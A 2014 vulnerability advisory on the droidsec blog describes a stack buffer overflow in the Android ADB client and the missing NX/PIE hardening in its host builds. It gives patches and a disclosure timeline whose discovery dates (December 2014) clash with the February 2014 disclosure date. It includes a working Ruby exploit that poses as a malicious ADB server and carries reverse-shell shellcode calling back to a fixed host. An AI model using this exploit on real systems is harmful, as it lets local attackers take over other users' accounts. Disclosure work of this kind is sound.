---
layout: post
title:  "Two Security Issues Found in the Android SDK Tools"
date:   2014-02-04 13:00:00
author: jduck
categories: advisories
tags: [ sdk, adb, bof ]
---

During an audit of the Android ADB source code, two security issues within the Android SDK Platform Tools were discoverd. When combined together, these issues can allow an unprivileged local user to gain access to the account of someone that uses the ADB tool.

Background
----------

Android Debug Bridge (ADB) is an official development tool provided by Google. It is perhaps the most instrumental tool since it facilitates communication between a host computer (the development machine) and an Android device. The architecture of ADB is broken into three components.

1. The ADB Daemon runs on an Android device. Whether or not it runs is controlled by the "USB Debugging" setting inside an Android device's settings menu. As the name of the setting suggests, it enables communicating with the device over USB, but also supports using a TCP port for communications.

2. The ADB Server runs on the development machine. This component is mostly transparent to the user and is only visible when first running the "adb" command or when using the "start-server" and "kill-server" commands. Among other things, it implements port forwarding and maintaining a persistent connection to devices connected to the host computer.

3. The ADB Client runs on the development machine too. It is the "adb" command that is used by a developer (or within various developer tools) to access an Android device. When using various options within the client, communications go through the ADB Server and to the ADB Daemon. Still, some commands like "adb devices" operate entirely within the host computer (between the Client and Server only).

The communications channels can be summarized in the following ASCII diagram:

[ADB Client] <-[localhost tcp]-> [ADB Server] <-[usb|tcp]-> [ADB Daemon]

Though default versions of Android >= 4.2.2 require authentication between the ADB Server and ADB Daemon, no authentication is required between the Client and Server. Since the Server listens on a TCP port, other users on a multi-user system can use the server to communicate with connected devices. Many developers commonly run the ADB Server with root privileges and ADB Client as a normal user. When used on a multi-user system, these design decisions leave much to be desired.


Findings
--------
Two issues were discovered during the audit: a stack buffer overflow and a failure to opt into security hardening features present in modern compilers.

### Issue #1 - ADB Client Stack Buffer Overflow

The first issue is an integer related issue in the ADB Client code. The relevant source code appears below. Note that this source code is from system/core/adb/adb_client.c from the android-4.4_r1.1 tag.

<p>
{% highlight C %}
219 int adb_connect(const char *service)
220 {
221     // first query the adb server's version
222     int fd = _adb_connect("host:version");
...
243         char buf[100];
244         int n;
245         int version = ADB_SERVER_VERSION - 1;
246
247         // if we have a file descriptor, then parse version result
248         if(fd >= 0) {
249             if(readx(fd, buf, 4)) goto error;
250
251             buf[4] = 0;
252             n = strtoul(buf, 0, 16);
253             if(n > (int)sizeof(buf)) goto error;
254             if(readx(fd, buf, n)) goto error;
{% endhighlight %}
</p>

On line 222, the ADB Client connects to the ADB Server. If it fails to connect, it will automatically launch a fresh ADB Server. When the connection succeeds, execution resumes on line 243.

The developer declares a stack buffer "buf" one hundred bytes in size on line 243 and the signed integer "n" on line 244. These two variables are the most important involved in this issue. On line 249, four bytes are read into the buffer. The ADB protocol specifies that these four bytes represent a 4-character long hex-ASCII number. Thus, the ADB Client extracts the value in hexadecimal on line 252.

The issue is twofold. First, the integer "n" is signed. Second, the "strtoul" function allows specifying whether or not the number is negative, despite the "ul" (meaning unsigned long) in its name. If an attacker runs a malicious server that replies with a length like "-b0f", the resulting value of "n" will be -2831. Since "n" is signed, and the developer casted the "sizeof" operator to a signed integer on line 253, the comparison there succeeds and execution proceeds to line 254. There, the "read" system call is called with the "buf" as the destination and -2831 as the number of bytes to read. This operation results in a vanilla stack buffer overflow. A tested patch for this issue is included.

Interestingly, other places in the code that use this construct properly use an "unsigned" type and do not cast the "sizeof" operator. For example, see the "adb_query" and "adb_status" functions.

### Issue #2 - Lack of hardening when compiling for a host

When investigating whether or not this particular issue was exploitable, it was determined that the "adb" binary supplied by Google does not contain two crucial modern protection mechanisms. Those are: non-executable stack protection and binary base randomization (PIE). Since these two protections are absent, exploiting this issue is trivial. A patch that adds these protections when compiling host binaries is included, though its is not well tested.

It should also be noted that host compilation also seems to intentionally opt out of the FORTIFY_SOURCE protections. It's not clear why this is the case since the comment near this line of code references an internal only bug number.

Affected Versions
-----------------
The discovery was made while reviewing ADB from the android-4.4_r1.1 AOSP tag.
Exploitation was confirmed possible using version 18.0.1 of the SDK platform-tools on x86_64 Ubuntu Linux 12.04.
Issues #1 and #2 are believed to be present in all current and previous versions.


Exploit Scenario
----------------
On a multi-user system, an attacker can start a malicious ADB Server and wait for other users to run the "adb" command. If an existing ADB Server is listening, an attacker will not be able to carry out this attack. Issue #1 happens very early during protocol negotiations so just about any command that communicates with the ADB Server will lead to successful exploitation.


Exploitability
--------------
Issue #1 does not appear to be exploitable on platforms other than Linux x86_64. On this platform, passing a large length argument to the "read" function succeeds. On others, including Linux x86, it leads to an error and no data is read into the specified buffer. It should be noted that Windows was not tested. The "adb" binary present on a Nexus 4 was tested and found not to be exploitable.

The following exploit leverages both issues:

<p>
{% highlight ruby %}
#!/usr/bin/env ruby
# -*- coding: binary -*-

require 'socket'
require 'uri'

puts "[*] Exploit for ADB client stack buffer overflow -jduck"

# linux/x86/shell_reverse_tcp - 90 bytes
# http://www.metasploit.com
# VERBOSE=false, LHOST=192.168.0.2, LPORT=2121,
# ReverseConnectRetries=5, ReverseAllowProxy=false,
# PrependFork=true, PrependSetresuid=false,
# PrependSetreuid=false, PrependSetuid=false,
# PrependSetresgid=false, PrependSetregid=false,
# PrependSetgid=false, PrependChrootBreak=false,
# AppendExit=true, InitialAutoRunScript=, AutoRunScript=
payload =
  "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x06\x31\xc0\xb0\x01\xcd" +
  "\x80\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66" +
  "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8" +
  "\x00\x02\x68\x02\x00\x08\x49\x89\xe1\xb0\x66\x50\x51\x53" +
  "\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f" +
  "\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x31" +
  "\xdb\x6a\x01\x58\xcd\x80"

def read_request(cli)
  len = cli.recv(4)
  len = len.to_i(16)
  puts "[*] request length: #{len}"

  buf = cli.recv(len)
  puts "[*] request: #{buf.inspect}"
  buf
end

srv = TCPServer.new 5037
loop {
  puts "[*] Waiting for client..."
  cli = srv.accept
  puts "[*] Accepted client"
	
  req = read_request(cli)
  if req != "host:version"
    puts "[-] incorrect request!"
    next
  end

  res = "OKAY"
  res << "-fff"
  res << ("A" * 112) # padding

  # popped registers
  res << [
    0xc0c00004, # ebx
    0xc0c00008, # esi
    0xc0c0000c, # edi
    0xc0c00010, # ebp
    #0x0810efd3, # eip - int 3 / ret
    0x812a14b, # eip - jmp esp
  ].pack('V*')

  res << payload

  puts "[*] Sending response (0x%x bytes)" % res.length
  cli.write(res)
  cli.close
}
srv.close
{% endhighlight %}
</p>


Remediation
-----------
Upon discovery, patches for both issues were developed and submitted to the Android Security Team. Although Google has not released a new version of the Android SDK Platform Tools as of the time of this publication, they have accepted and applied both patches. The next SDK release will most likely include these fixes. In the meantime, apply the following patches and rebuild your ADB client binary.

The patch for issue #1 was committed to Google's internal Android tree as part of an embargo scheduled for Februrary 1st, 2014. That date has since elapsed and Google has made no effort to coordinate by acknowledging our proposed date or proposing a different date. The patch for issue #1 is as follows:

<o>
{% highlight diff %}
diff --git a/adb/adb_client.c b/adb/adb_client.c
index 8340738..ef0077b 100644
--- a/adb/adb_client.c
+++ b/adb/adb_client.c
@@ -241,7 +241,7 @@ int adb_connect(const char *service)
     } else {
         // if server was running, check its version to make sure it is not out of date
         char buf[100];
-        int n;
+        unsigned n;
         int version = ADB_SERVER_VERSION - 1;
 
         // if we have a file descriptor, then parse version result
@@ -250,7 +250,7 @@ int adb_connect(const char *service)
 
             buf[4] = 0;
             n = strtoul(buf, 0, 16);
-            if(n > (int)sizeof(buf)) goto error;
+            if(n > sizeof(buf)) goto error;
             if(readx(fd, buf, n)) goto error;
             adb_close(fd);
{% endhighlight %}
</p>

The patch submitted for issue #2 required being split in two and underwent several revisions before being accepted. One patch enables non-executable stack. The other enables position independent execution (PIE) for binary base randomization. Once accepted, the patches were merged into the aosp/master branch of the Android Open Source Project repository. More information, including links to Google's Gerrit code review system and the commits/patches themselves, follow:

<ul>
<li><a href="https://android-review.googlesource.com/#/c/72228/">Enable NX protections</a> / <a href="https://android.googlesource.com/platform/build/+/afb45637b2581be3501e520477b6b264fb2fed9e">afb45637b2581be3501e520477b6b264fb2fed9e</a>
</li>

<li><a href="https://android-review.googlesource.com/#/c/72229/">Enable PIE for dynamically linked Linux host executables</a> / <br />
<a href="https://android.googlesource.com/platform/build/+/b0eafa21b9ac578e279198b8650fafbee6b83dc3">b0eafa21b9ac578e279198b8650fafbee6b83dc3</a>
</li>
</ul>
<p></p>

Credits
-------
Joshua J. Drake of <a href=http://www.droidsec.org/>droidsec.org</a> discovered and provided patches for these issues.


Timeline
--------
<p>
<ul>
<li>2014-12-02 - Issue #1 discovered
<li>2014-12-05 - Issue #2 discovered
<li>2014-12-08 - Patches and advisory created and submitted to the Android Security Team
<li>2014-01-24 - Tweet announcing upcoming disclosure
<li>2014-01-24 - Follow up sent, no human response
<li>2014-02-04 - Public disclosure
</ul>
</p>

